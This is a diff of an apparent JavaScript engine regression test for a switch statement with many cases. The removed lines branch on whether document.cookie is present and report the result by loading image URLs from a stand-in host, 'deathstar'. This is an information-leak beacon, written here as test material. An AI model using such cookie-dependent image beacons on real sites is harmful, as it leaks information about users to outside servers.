@@ -40,25 +40,12 @@ var gTestfile = 'regress-324650.js';
 //-----------------------------------------------------------------------------
 var BUGNUMBER = 324650;
 var summary = 'Switch Statement with many cases';
-var actual = '';
-var expect = '';
+var actual = 'No Hang';
+var expect = 'No Hang';
 
 printBugNumber(BUGNUMBER);
 printStatus (summary);
 
-if (typeof document != 'undefined')
-{
-  document.images[0] = new Image();
-}
-else
-{
-  document = {images: [{src: ''}]};
-}
-
-var evil = 2;
-if (document.cookie) {
-  evil = "ze";
-}
 var notevil = "z1";
 var notevil2 = "z2";
 var notevil3 = "z3";
@@ -5470,35 +5457,5 @@ default:
   dut = 3;
   break;
 }
-
-var url = "http://deathstar/01.jpg?normal=" + dut;
-document.images[0].src = url;
-
-/* if with evil val */
-
-if (document.cookie) {
-  switch ( notevil2 ) {
-  case "z2": dut2 = 2;
-    break;
-  default:
-    dut2 = 3;
-    break;
-  }
-}
-
-var url2 = "http://deathstar/01.jpg?if=" + dut2;
-document.images[0].src = url2;
-
-/* normal usage */
-
-switch ( evil ) {
-case "ze": dut3 = 2;
-  break;
-default:
-  dut3 = 3;
-  break;
-}
-var url3 = "http://deathstar/01.jpg?isevil=" + dut3;
-document.images[0].src = url3;
 
 reportCompare(expect, actual, summary);
